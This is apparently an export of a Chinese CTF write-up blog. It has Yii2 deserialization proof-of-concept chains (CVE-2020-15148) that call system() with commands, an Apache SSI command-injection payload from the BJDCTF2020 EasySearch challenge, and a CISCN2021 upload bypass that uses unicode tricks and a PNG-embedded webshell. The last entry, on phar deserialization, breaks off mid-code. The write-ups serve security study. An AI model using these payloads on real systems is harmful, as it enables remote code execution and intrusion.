php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;        <span class="hljs-keyword">public</span> $id;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls&#x27;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;        <span class="hljs-keyword">protected</span> $formatters;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-comment">// 这里需要改为isRunning</span>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;isRunning&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];        &#125;    &#125;&#125;<span class="hljs-comment">// poc2</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span>&#123;        <span class="hljs-keyword">private</span> $processes;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;processes = [<span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>()];        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    // 生成<span class="hljs-title">poc</span>    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>\<span class="hljs-title">RunProcess</span>()));&#125;<span class="hljs-meta">?&gt;</span></code></pre><h3 id="POC4"><a class="header-anchor" href="#POC4">🍭</a>POC4</h3><p>同样从__destruct入手找到的</p><p><img src="/2021/07/12/filter/17.jpg" alt="17"></p><p>跟进clearAll</p><img src="/2021/07/12/filter/18.jpg" alt="18" style="zoom: 67%;"><p><code>$this-&gt;keys</code>、<code>$nsKey、$itemKey</code>都可控，跟进clearKey：</p><img src="/2021/07/12/filter/19.jpg" alt="19" style="zoom:67%;"><p><code>$this-&gt;path</code>也可控，而且这里是一个字符串拼接操作，则可利用魔术方法<code>__toString</code>来触发后续操作</p><p>全局搜索<code>__toString</code>方法：</p><p><img src="/2021/07/12/filter/20.jpg" alt="20"></p><p>跟链一一样触发__call</p><p>payload</p><pre><code class="hljs xquery"><span class="hljs-type">namespace</span> &#123;    class Swift_KeyCache_DiskKeyCache&#123;        private <span class="hljs-variable">$path</span>;        private <span class="hljs-variable">$keys</span> = [];        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$path</span>,<span class="hljs-variable">$keys</span>) &#123;            <span class="hljs-variable">$this-</span><span class="hljs-built_in">&gt;path</span> = <span class="hljs-variable">$path</span>;            <span class="hljs-variable">$this-</span>&gt;keys = <span class="hljs-variable">$keys</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> Codeception\Util&#123;    class XmlBuilder&#123;        protected <span class="hljs-variable">$__dom__</span>;        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$__dom__</span>) &#123;            <span class="hljs-variable">$this-</span>&gt;__dom_<span class="hljs-number">_</span> = <span class="hljs-variable">$__dom__</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> Faker&#123;    class Generator&#123;        protected <span class="hljs-variable">$formatters</span> = <span class="hljs-keyword">array</span>();        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$formatters</span>) &#123;            <span class="hljs-variable">$this-</span>&gt;formatters = <span class="hljs-variable">$formatters</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> yii\rest&#123;    class CreateAction&#123;        public <span class="hljs-variable">$checkAccess</span>;        public <span class="hljs-variable">$id</span>;        public <span class="hljs-keyword">function</span> __construct(<span class="hljs-variable">$checkAccess</span>,<span class="hljs-variable">$id</span>)&#123;            <span class="hljs-variable">$this-</span>&gt;checkAccess = <span class="hljs-variable">$checkAccess</span>;            <span class="hljs-variable">$this-</span><span class="hljs-built_in">&gt;id</span> = <span class="hljs-variable">$id</span>;        &#125;    &#125;&#125;<span class="hljs-type">namespace</span> &#123;    <span class="hljs-variable">$c</span> = new yii\rest\CreateAction(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>);    <span class="hljs-variable">$b</span> = new Faker\Generator(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;saveXML&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&#x27;run&#x27;</span>)));    <span class="hljs-variable">$a</span> = new Codeception\Util\XmlBuilder(<span class="hljs-variable">$b</span>);    <span class="hljs-variable">$d</span> = new Swift_KeyCache_DiskKeyCache(<span class="hljs-variable">$a</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;kawhi&#x27;</span>=&gt;<span class="hljs-string">&#x27;kawhi&#x27;</span>));    print(urlencode(serialize(<span class="hljs-variable">$d</span>)));&#125;</code></pre><h3 id="POC4-2"><a class="header-anchor" href="#POC4-2">🍭</a>POC4-2</h3><p>__tostring入手还可找到see.php</p><p><img src="/2021/07/12/filter/21.jpg" alt="21"></p><p><code>$this-&gt;description</code>可控，又可以利用<code>__call</code>，思路：</p><p><code>Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;        <span class="hljs-keyword">public</span> $id;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls&#x27;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;        <span class="hljs-keyword">protected</span> $formatters;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-comment">// 这里需要改为isRunning</span>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;render&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">See</span></span>&#123;        <span class="hljs-keyword">protected</span> $description;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;description = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>\<span class="hljs-title">See</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span></span>&#123;        <span class="hljs-keyword">private</span> $keys = [];        <span class="hljs-keyword">private</span> $path;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-keyword">new</span> See;            <span class="hljs-keyword">$this</span>-&gt;keys = <span class="hljs-keyword">array</span>(                <span class="hljs-string">&quot;axin&quot;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;is&quot;</span>=&gt;<span class="hljs-string">&quot;handsome&quot;</span>)            );        &#125;    &#125;    <span class="hljs-comment">// 生成poc</span>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Swift_KeyCache_DiskKeyCache()));&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>Description.php里也有一条，但原理一样，不再赘述。</p><p>参考:</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0ODg2MDA0NQ==&amp;mid=2247484726&amp;idx=1&amp;sn=5f268e5a840dbecad80224dc9a53e525&amp;chksm=fbb9fcd4ccce75c2d5c72ed67b50976b40b121abb495df70939895ed8c909040ce9ebe077913&amp;mpshare=1&amp;scene=23&amp;srcid=0921cI0QgoWweYnLNsGy7GgR&amp;sharer_sharetime=1600694482848&amp;sharer_shareid=b30d61744bd3c2a98fea51904fc6f025#rd">Yii2 反序列化（CVE-2020-15148）分析                </a></p><p><a href="https://juejin.cn/post/6874149010832097294#heading-0">我是如何挖掘yii2的反序列化0day的</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020||EasySearch</title>
    <link href="/2021/07/11/web/"/>
    <url>/2021/07/11/web/</url>
    
    <content type="html"><![CDATA[<p>这题涉及一个新漏洞——Apache SSI 远程命令执行漏洞</p><h4 id="SSI"><a class="header-anchor" href="#SSI">🍭</a>SSI</h4><p>SSI（服务器端包含）是放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估，它提供了一种对现有HTML文档增加动态内容的方法，不需要编写复杂的JSP/PHP/ASP等程序或者调用CGI程序。默认扩展名是 .stm、.shtm 和 .shtml。</p><p>例如，您可以将指令放置到现有的HTML页面中：</p><pre><code class="hljs javascript">&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</code></pre><p>当该页面被投放时，该片段将被评估并替换为其值：</p><pre><code class="hljs javascript">Sunday, <span class="hljs-number">11</span>-July<span class="hljs-number">-2013</span> <span class="hljs-number">19</span>:<span class="hljs-number">28</span>:<span class="hljs-number">54</span> EST</code></pre><h4 id="回归题目："><a class="header-anchor" href="#回归题目：">🍭</a>回归题目：</h4><p>题目是一个登录框，扫目录扫到了index.php.swp，进去是一段源代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ob_start();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;$chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;$random = $chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span>$content = uniqid().$random;<span class="hljs-keyword">return</span> sha1($content); &#125;    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);***    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )    &#123;        $admin = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;        <span class="hljs-keyword">if</span> ( $admin == substr(md5($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;            $file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;            $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);            $text = <span class="hljs-string">&#x27;</span><span class="hljs-string">            ***</span><span class="hljs-string">            ***</span><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><span class="hljs-string">            ***</span><span class="hljs-string">***&#x27;</span>;            fwrite($shtml,$text);            fclose($shtml);            ***<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;                &#125;<span class="hljs-keyword">else</span>    &#123;***    &#125;***<span class="hljs-meta">?&gt;</span></code></pre><p>根据题意，跑出MD5加密前面是6d0bc1的密文</p><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">1000000000</span>):</span><span class="hljs-function">    <span class="hljs-variable">a</span> = <span class="hljs-variable">hashlib.md5</span>(<span class="hljs-title">str</span>(<span class="hljs-variable">i</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()</span>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">a</span>)</span></code></pre><p>结果：</p><p><img src="/2021/07/11/web/1.png" alt="1"></p><p>选一个登录，抓包</p><p><img src="/2021/07/11/web/1.jpg" alt="1"></p><p>返回包中会生成一个后缀为.shtml文件（将用户名写入文件中）。</p><p>利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令。</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;命令&quot;--&gt;</span></code></pre><p>首先ls一下当前目录：</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span></code></pre><p><img src="/2021/07/11/web/2.jpg" alt="2"></p><p>flag不在此目录，返回上一级</p><p><img src="/2021/07/11/web/3.jpg" alt="3"></p><p>访问</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span></code></pre><p>即可得到flag。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2021||upload</title>
    <link href="/2021/07/11/upload-1/"/>
    <url>/2021/07/11/upload-1/</url>
    
    <content type="html"><![CDATA[<h3 id="分析"><a class="header-anchor" href="#分析">🍭</a>分析</h3><p>题目给了源码index.php做出了如下限制。这题跟之前upload靶场的二次渲染很像。</p><ul><li>上传需要绕过<code>getimagesize</code></li><li>图片的长宽必须为1.</li><li>文件名不能有c、i、h.这样平常普通的绕过手段，.htaccess 的h被过滤，.use.ini 的i被过滤，就算抓包修改他的后缀，也会一起被检测。</li></ul><h4 id="getimagesize"><a class="header-anchor" href="#getimagesize">🍭</a>getimagesize()</h4><p>getimagesize() 函数用于获取图像大小及相关信息，根据判断文件类型和文件大小（构造文件头）来判断上传文类型。</p><p>怎么来绕过它呢？getimagesize 这个函数是检查图片的前面16进制来检查是否为图片。如果在16进制后面加入恶意代码，就可以上传图片和本地文件包含漏洞（改URL的）结合 达到入侵的目的！即制作包含恶意代码的图片！<br>制作方法：</p><ul><li><p>直接伪造头部GIF89A</p></li><li><p><code>copy /b test.png +muma.php ccc.png </code> //伪造头部</p><p>其中test.png为 原始图片 ，此命令将 test.png 和muma.php 合成，重新生成ccc.png,然后上传 ccc.png</p></li><li><p>使用GIMP通过增加备注，写入执行命令</p></li></ul><p>本题绕过<code>getimagesize</code>比较简单使用XMB头即可：</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_height 1</span></code></pre><h4 id="stristr（）"><a class="header-anchor" href="#stristr（）">🍭</a>stristr（）</h4><p>源码出现了<code>mb_strtolower</code>，可以使用<code>Unicode</code></p><p><img src="/2021/07/11/upload-1/1.png" alt="1"></p><p>fuzz可以知道部分字母在经过<code>mb_strtolower</code>处理过可以等效普通字母的。如 <code>i</code>可以用(%C5%BF)代替：</p><pre><code class="hljs php">$imagePath = <span class="hljs-string">&quot;image/&quot;</span> . mb_strtolower($fileName);<span class="hljs-comment">//</span>可以利用一些unicode字符绕过。经过测试发现<span class="hljs-meta">&lt;?php</span>var_dump(mb_strtolower(<span class="hljs-string">&#x27;İ&#x27;</span>)===<span class="hljs-string">&#x27;i&#x27;</span>);<span class="hljs-meta">?&gt;</span>结果为<span class="hljs-literal">true</span>并且前面还进行了url解密。所以可以用%c4%b0代替<span class="hljs-string">&#x27;İ&#x27;</span>字符</code></pre><p>但是h没有相关字母可以代替，暂时行不通。</p><p>扫目录发现<code>example.php</code>再具体分析。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;poc&quot;</span>) &#123;    $zip = <span class="hljs-keyword">new</span> \ZipArchive();    $name_for_zip = <span class="hljs-string">&quot;example/&quot;</span> . $_POST[<span class="hljs-string">&quot;file&quot;</span>];    <span class="hljs-keyword">if</span>(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip))<span class="hljs-number">-1</span>]!==<span class="hljs-string">&quot;zip&quot;</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;要不咱们再看看？&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="hljs-literal">TRUE</span>) &#123;        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;都不能解压呢&quot;</span>);    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;可以解压，我想想存哪里&quot;</span>;    $pos_for_zip = <span class="hljs-string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(<span class="hljs-string">&quot;<span class="hljs-subst">$pos_for_zip</span>/*&quot;</span>);    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file)&#123;        <span class="hljs-keyword">if</span> (is_dir($file)) &#123;            <span class="hljs-keyword">continue</span>;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;width&#x27;</span> =&gt; $size, <span class="hljs-string">&#x27;height&#x27;</span> =&gt; $size]);        <span class="hljs-keyword">if</span> ($second !== <span class="hljs-literal">FALSE</span>) &#123;            $final_name = pathinfo($file)[<span class="hljs-string">&quot;basename&quot;</span>];            imagepng($second, <span class="hljs-string">&#x27;example/&#x27;</span>.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>其中</p><p><img src="/2021/07/11/upload-1/1.jpg" alt="1"></p><p>需要上传<code>zip</code>格式然后通过这个程序解压，需要绕过<code>imagecreatefrompng</code>,用脚本来生成图片马：<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>先修改脚本的payload部分：</p><p><img src="/2021/07/11/upload-1/2.png" alt="2"></p><p>得到的数据进行修改</p><p><img src="/2021/07/11/upload-1/3.png" alt="3"></p><p>复制出十六进制，到网站转换成payload</p><p><img src="/2021/07/11/upload-1/4.png" alt="4"></p><p>修改脚本</p><p><img src="/2021/07/11/upload-1/5.png" alt="5"></p><p>生成图片马</p><p><img src="/2021/07/11/upload-1/6.png" alt="6"></p><p>修改图片后缀为php然后压缩成zip，上传文件并抓包，修改文件名并添加长度绕过的字符串</p><p><img src="/2021/07/11/upload-1/7.png" alt="7"></p><p>post上传的网页源码：</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf=upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;postedFile&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postedFile&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>解压</p><p><img src="/2021/07/11/upload-1/2.jpg" alt="2"></p><p>试着访问/example/a.php成功，蚁剑进行连接，在etc找到目录访问。</p><p><img src="/2021/07/11/upload-1/9.png" alt="9"></p><p>参考：<a href="https://blog.csdn.net/miuzzx/article/details/116885083">ciscn国赛初赛web</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>dropbox</title>
    <link href="/2021/05/18/dropbox/"/>
    <url>/2021/05/18/dropbox/</url>
    
    <content type="html"><![CDATA[<p>这道题涉及了phar反序列化，__call魔术方法等多个知识点。</p><p>登录页面后随意上传图片，发现任意下载</p><img src="/2021/05/18/dropbox/1.jpg" alt="1" style="zoom:67%;"><p>将文件都下载，进行审计</p><p><code>class.php</code>:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$dbaddr = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;$dbuser = <span class="hljs-string">&quot;root&quot;</span>;$dbpass = <span class="hljs-string">&quot;root&quot;</span>;$dbname = <span class="hljs-string">&quot;dropbox&quot;</span>;$db = <span class="hljs-keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> $db;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">global</span> $db;        <span class="hljs-keyword">$this</span>-&gt;db = $db;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params">$username</span>) </span>&#123;        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);        $stmt-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        <span class="hljs-keyword">if</span> ($count === <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params">$username, $password</span>) </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user_exist($username)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        $password = sha1($password . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);        $stmt-&gt;bind_param(<span class="hljs-string">&quot;ss&quot;</span>, $username, $password);        $stmt-&gt;execute();        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params">$username, $password</span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;user_exist($username)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        $password = sha1($password . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);        $stmt-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;            